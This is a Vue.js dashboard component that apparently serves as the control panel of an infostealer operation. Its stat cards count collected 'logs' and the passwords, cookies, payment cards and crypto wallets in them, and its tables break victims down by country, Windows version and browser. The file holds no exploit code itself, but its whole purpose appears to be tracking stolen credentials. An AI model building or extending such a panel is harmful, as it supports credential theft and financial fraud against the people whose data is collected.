<template>
  <div>
    <div class="row">
      <div class="col-md-12">
        <div class="card card-stats card-raised">
          <div class="card-body">
            <div class="row" v-loading="logsInfo.isLoading">
              <div class="col-md-3">
                <div class="statistics">
                  <div class="info">
                    <div class="icon icon-primary">
                      <i class="far fa-file"></i>
                    </div>
                    <h3 class="info-title">
                      <animated-number :value="logsInfo.data.total"></animated-number>
                    </h3>
                    <h6 class="stats-title">Total</h6>
                  </div>
                </div>
              </div>
              <div class="col-md-3">
                <div class="statistics">
                  <div class="info">
                    <div class="icon icon-warning">
                      <i class="fal fa-check-square"></i>
                    </div>
                    <h3 class="info-title">
                      <animated-number :value="logsInfo.data.new"></animated-number>
                    </h3>
                    <h6 class="stats-title">Not checked</h6>
                  </div>
                </div>
              </div>
              <div class="col-md-3">
                <div class="statistics">
                  <div class="info">
                    <div class="icon icon-info">
                      <i class="fal fa-calendar-day"></i>
                    </div>
                    <h3 class="info-title">
                      <animated-number :value="logsInfo.data.today"></animated-number>
                    </h3>
                    <h6 class="stats-title">Today</h6>
                  </div>
                </div>
              </div>
              <div class="col-md-3">
                <div class="statistics">
                  <div class="info">
                    <div class="icon icon-danger">
                      <i class="fal fa-calendar-week"></i>
                    </div>
                    <h3 class="info-title">
                      <animated-number :value="logsInfo.data.week"></animated-number>
                    </h3>
                    <h6 class="stats-title">Week</h6>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="row">
      <div class="col-md-3">
        <stats-card v-loading="logsInfo.isLoading"
                    type="danger"
                    :title="logsInfo.data.passwords"
                    subTitle="Passwords"
                    icon="fal fa-key">
        </stats-card>
      </div>
      <div class="col-md-3">
        <stats-card v-loading="logsInfo.data.isLoading"
                    type="info"
                    :title="logsInfo.data.cookies"
                    subTitle="Cookies"
                    icon="fal fa-cookie">
        </stats-card>
      </div>
      <div class="col-md-3">
        <stats-card v-loading="logsInfo.data.isLoading"
                    type="primary"
                    :title="logsInfo.data.cards"
                    subTitle="Cards"
                    icon="fal fa-credit-card">
        </stats-card>
      </div>
      <div class="col-md-3">
        <stats-card v-loading="logsInfo.data.isLoading"
                    type="warning"
                    :title="logsInfo.data.wallets"
                    subTitle="Wallets"
                    icon="fab fa-btc">
        </stats-card>
      </div>
    </div>

    <div class="row">
      <div class="col">
        <card class="card-chart" no-footer-line v-loading="bubbleMapData.isLoading">
          <h5 slot="header" class="card-title"><i class="fal fa-map-marked"></i> Map data</h5>
          <div class="row">
            <div class="col-sm-8">
              <bubble-map v-if="!bubbleMapData.isLoading && bubbleMapData.data"
                      :map-data="bubbleMapData"
                      style="height: 50vh;">
              </bubble-map>
              <div v-else style="text-align: center">
                <span class="el-table__empty-text">No Data</span>
              </div>
            </div>
            <div class="col-sm-4">
              <div v-if="!topCountriesData.isLoading && topCountriesData.data">
                <el-table :data="topCountriesData.data" width="100">
                  <el-table-column label="Code">
                    <template slot-scope="props">
                      <span v-if="props.row.country !== 'UNK'" :class="'flag-icon flag-icon-'+props.row.country | lowercaseCountry"></span>
                      <span class="ml-2">{{props.row.country}}</span>
                    </template>
                  </el-table-column>
                  <el-table-column prop="count" label="Count"></el-table-column>
                  <el-table-column label="Percent">
                    <template slot-scope="props">
                      <span>{{props.row.percent}}%</span>
                    </template>
                  </el-table-column>
                </el-table>
                <div style="text-align: center; margin-top: 10px;">
                  <el-button  type="primary"
                              size="small"
                              @click="showCountriesModal()"
                  >
                    Show all countries
                  </el-button>
                </div>
                <el-dialog  title="All countries"
                            :visible.sync="countriesData.showModal"
                            width="350px"
                >
                  <div v-loading="countriesData.isLoading" style="margin-top: -20px;">
                    <el-table :data="paginate" width="100" v-if="countriesData.data.length">
                      <el-table-column label="Code">
                        <template slot-scope="props">
                          <span v-if="props.row.country !== 'UNK'" :class="'flag-icon flag-icon-'+props.row.country | lowercaseCountry"></span>
                          <span class="ml-2">{{props.row.country}}</span>
                        </template>
                      </el-table-column>
                      <el-table-column prop="count" label="Count"></el-table-column>
                      <el-table-column label="Percent">
                        <template slot-scope="props">
                          <span>{{props.row.percent}}%</span>
                        </template>
                      </el-table-column>
                    </el-table>
                    <div slot="footer" class="col-12 d-flex justify-content-center justify-content-sm-between flex-wrap mt-3">
                      <span></span>
                      <pagination class="pagination-primary"
                                  v-model="pagination.currentPage"
                                  :per-page="pagination.perPage"
                                  :total="countriesData.data.length"/>
                      <span></span>
                    </div>
                  </div>
                </el-dialog>
              </div>
              <div v-else style="text-align: center">
                <span class="el-table__empty-text">No Data</span>
              </div>
            </div>
          </div>
        </card>
      </div>
    </div>

    <div class="row">
      <div class="col-md-4">
        <card class="card" no-footer-line v-loading="topPrefixData.isLoading">
          <h5 slot="header" class="card-title"><i class="fal fa-hashtag"></i> Top prefix</h5>
          <div v-if="!topPrefixData.isLoading && topPrefixData.data">
            <el-table :data="topPrefixData.data" width="100">
              <el-table-column prop="prefix" label="Prefix"></el-table-column>
              <el-table-column prop="count" label="Count"></el-table-column>
              <el-table-column label="Percent">
                <template slot-scope="props">
                  <span>{{props.row.percent}}%</span>
                </template>
              </el-table-column>
            </el-table>
          </div>
          <div v-else style="text-align: center">
            <span class="el-table__empty-text">No Data</span>
          </div>
        </card>
      </div>
      <div class="col-md-4">
        <card class="card" no-footer-line v-loading="winData.isLoading">
          <h5 slot="header" class="card-title"><i class="fab fa-windows"></i> Top win</h5>
          <div v-if="!winData.isLoading && winData.data">
            <el-table :data="winData.data" width="100">
              <el-table-column prop="win_ver" label="Win"></el-table-column>
              <el-table-column prop="count" label="Count"></el-table-column>
              <el-table-column label="Percent">
                <template slot-scope="props">
                  <span>{{props.row.percent}}%</span>
                </template>
              </el-table-column>
            </el-table>
          </div>
          <div v-else style="text-align: center">
            <span class="el-table__empty-text">No Data</span>
          </div>
        </card>
      </div>
      <div class="col-md-4">
        <card class="card" no-footer-line v-loading="softData.isLoading">
          <h5 slot="header" class="card-title"><i class="fal fa-browser"></i> Top browsers</h5>
          <div v-if="!softData.isLoading && softData.data">
            <el-table :data="softData.data" width="100">
              <el-table-column prop="name" label="Name"></el-table-column>
              <el-table-column prop="count" label="Count"></el-table-column>
              <el-table-column label="Percent">
                <template slot-scope="props">
                  <span>{{props.row.percent}}%</span>
                </template>
              </el-table-column>
            </el-table>
          </div>
          <div v-else style="text-align: center">
            <span class="el-table__empty-text">No Data</span>
          </div>
        </card>
      </div>
    </div>
  </div>
</template>

<script>
import {AnimatedNumber, StatsCard, BubbleMap, Card, Pagination} from 'src/components';
import store from 'src/store'

export default {
  components: {
    AnimatedNumber,
    StatsCard,
    BubbleMap,
    Card,
    Pagination
  },
  data() {
    return {
      logsInfo: {
        isLoading: true,
        data: [],
      },
      bubbleMapData: {
        isLoading: true,
        data: []
      },
      topCountriesData: {
        isLoading: true,
        data: []
      },
      pagination: {
        perPage: 10,
        currentPage: 1,
      },
      countriesData: {
        showModal: false,
        isLoading: true,
        data: []
      },
      form: {},
      softData: {
        isLoading: true,
        data: []
      },
      topPrefixData:  {
        isLoading: true,
        data: []
      },
      winData:  {
        isLoading: true,
        data: []
      },
    };
  },
  filters: {
    lowercaseCountry(data) {
      return data.toLowerCase();
    },
  },
  async mounted() {
    this.logsInfo.isLoading = true;
    await this.$store.dispatch('GET_LOGS_INFO');
    this.logsInfo.data = this.$store.getters.LOGS_INFO;
    this.logsInfo.isLoading = false;

    this.bubbleMapData.isLoading = true;
    await this.$store.dispatch('GET_MAP_DATA');
    this.bubbleMapData.data = this.$store.getters.MAP_DATA;
    this.bubbleMapData.isLoading = false;

    this.topCountriesData.isLoading = true;
    await this.$store.dispatch('GET_TOP_COUNTRIES_DATA');
    this.topCountriesData.data = this.$store.getters.TOP_COUNTRIES_DATA;
    this.topCountriesData.isLoading = false;

    this.softData.isLoading = true;
    await this.$store.dispatch('GET_SOFT_DATA');
    this.softData.data = this.$store.getters.SOFT_DATA;
    this.softData.isLoading = false;

    this.topPrefixData.isLoading = true;
    await this.$store.dispatch('GET_TOP_PREFIX_DATA');
    this.topPrefixData.data = this.$store.getters.TOP_PREFIX_DATA;
    this.topPrefixData.isLoading = false;

    this.winData.isLoading = true;
    await this.$store.dispatch('GET_WIN_DATA');
    this.winData.data = this.$store.getters.WIN_DATA;
    this.winData.isLoading = false;
  },
  computed: {
    from() {
      return this.pagination.perPage * (this.pagination.currentPage - 1);
    },
    to() {
      let highBound = this.from + this.pagination.perPage;
      if (this.countriesData.data.length < highBound) {
        highBound = this.countriesData.data.length;
      }
      return highBound;
    },
    paginate() {
      let result = this.countriesData.data;
      if (this.countriesData.data.length > 0) {
        result = this.countriesData.data;
      }
      return result.slice(this.from, this.to);
    }
  },
  methods: {
    async showCountriesModal() {
      this.countriesData.showModal = true;
      this.countriesData.isLoading = true;
      if (!this.$store.getters.COUNTRIES_DATA.length) {
        await this.$store.dispatch('GET_COUNTRIES_DATA');
      }
      this.countriesData.data = this.$store.getters.COUNTRIES_DATA;
      this.countriesData.isLoading = false;
    }
  }
};
</script>

<style>
.card {
    border: 0 !important;
    border-radius: 0.1875rem !important;
    display: inline-block !important;
    position: relative !important;
    width: 100% !important;
    margin-bottom: 20px !important;
    -webkit-box-shadow: 0 1px 15px 1px rgba(39, 39, 39, 0.1);
    box-shadow: 0 1px 15px 1px rgba(39, 39, 39, 0.1);
    margin-top: 0 !important;
}
</style>
